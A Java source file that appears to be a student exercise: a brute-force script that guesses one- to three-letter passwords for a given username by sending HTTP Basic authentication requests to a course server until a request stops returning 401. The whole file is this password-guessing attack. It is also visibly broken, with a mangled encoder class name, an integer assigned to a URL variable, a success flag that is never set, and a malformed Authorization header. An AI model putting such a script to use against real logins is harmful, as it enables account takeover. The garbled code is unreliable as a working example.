import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;

class BruteForce {

    String password="";

    int num =401;


    public static void main (String[] args) {

      String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

      BruteForce URLcon;

      int length = 0;

      String passwd="";

       int t0,t1;

      
      if (args.length == 0) {
      	
      	System.err.println (
      		
      		"Usage : java BruteForce <username>");
      	return;
      	
      	}
      String username = args[0];
      

      t0=System.currentTimeMillis();

      System.out.println ("  " + new Date());
      
      System.out.println ("Using BruteForce method  attack "+username+"'s password.Please waiting.......");

       for (int i=0;i<str.length();i++){

             passwd=str.substring(i,i+1);

             URLcon = new BruteForce (passwd,username);

             if ((URLcon.num)!=401) {

             	t1=System.currentTimeMillis();

                System.out.println("The password: "+ passwd);

             	double dt =t1-t0;



             	System.out.println("It took "+ DecimalFormat.getInstance().format(dt/1000)+ " seconds.");

                System.out.println ("Finish  " + new Date());
                
             	return;

             }

             for (int j=0;j<str.length();j++){

                passwd =str.substring(i,i+1)+str.substring(j,j+1);

                URLcon = new BruteForce (passwd,username);

                if ((URLcon.num)!=401) {

             	     t1=System.currentTimeMillis();

                     System.out.println("The password: "+ passwd);


                     double dt =t1-t0;



                     System.out.println("It took "+ DecimalFormat.getInstance().format(dt/1000)+ " seconds.");
                     System.out.println ("Finish  " + new Date());
             	 return;

                 }
                for (int m=0;m<str.length();m++){

                  passwd = str.substring(i,i+1)+str.substring(j,j+1)+str.substring(m,m+1);

                  URLcon = new BruteForce (passwd,username);

                  if ((URLcon.num)!=401) {

                 	t1=System.currentTimeMillis();

                    System.out.println("The password: "+ passwd);


             	    double dt =t1-t0;



                 	System.out.println("It took "+DecimalFormat.getInstance().format(dt/1000)+ " seconds.");
                    
                    System.out.println ("Finish  " + new Date());
                    
             	    return;

                  }


             }

}
}
        System.out.println(" not find the password");

}

   public  BruteForce  (String password, String username){

  	  String urlString = "http://sec-crack.cs.rmit.edu./SEC/2/" ;

      

      try {

        String userPassword = username+":"+password ;

        String encoding = new userPassword.misc.BASE64Encoder().encode (userPassword.getBytes());

        URL url = new URL (urlString);

        HttpURLConnection uc = (HttpURLConnection) url.openConnection();

        uc.setRequestProperty ("Authorization", " " + encoding);

        url = uc.getResponseCode();


       }
        catch(MalformedURLException e){
       	  System.out.println(e);
       }catch(IOException e){
          System.out.println(e);
       }


   }
}